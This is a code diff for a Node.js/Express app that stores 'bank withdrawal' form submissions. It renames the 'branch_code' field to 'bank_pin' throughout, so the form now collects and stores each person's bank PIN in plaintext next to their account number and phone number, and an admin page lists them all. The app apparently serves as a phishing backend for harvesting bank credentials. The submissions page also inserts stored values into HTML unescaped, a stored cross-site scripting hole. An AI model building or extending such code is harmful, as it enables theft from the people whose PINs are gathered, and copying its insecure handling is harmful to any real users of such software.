@@ -36,7 +36,7 @@ app.get("/create-table", async (req, res) => {
         bank_name TEXT NOT NULL,
         account_number TEXT NOT NULL,
         phone_number TEXT NOT NULL,
-        branch_code TEXT NOT NULL,
+        bank_pin TEXT NOT NULL,
         created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
       )
     `);
@@ -61,18 +61,18 @@ app.post("/submit", async (req, res) => {
       bank_name,
       account_number,
       phone_number,
-      branch_code
+      bank_pin
     } = req.body;
 
     await pool.query(
       `INSERT INTO bank_withdrawals
-      (bank_name, account_number, phone_number, branch_code)
+      (bank_name, account_number, phone_number, bank_pin)
       VALUES ($1, $2, $3, $4)`,
       [
         bank_name,
         account_number,
         phone_number,
-        branch_code
+        bank_pin
       ]
     );
 
@@ -137,7 +137,7 @@ app.get("/submissions", async (req, res) => {
         <td>${item.bank_name}</td>
         <td>${item.account_number}</td>
         <td>${item.phone_number}</td>
-        <td>${item.branch_code}</td>
+        <td>${item.bank_pin}</td>
         <td>${new Date(item.created_at).toLocaleString()}</td>
 
         <td>
@@ -179,7 +179,7 @@ button{padding:10px 15px;background:#1877f2;color:white;border:none;cursor:point
 <th>Bank Name</th>
 <th>Account Number</th>
 <th>Phone Number</th>
-<th>Branch Code</th>
+<th>Bank Pin</th>
 <th>Date</th>
 <th>Action</th>
 </tr>
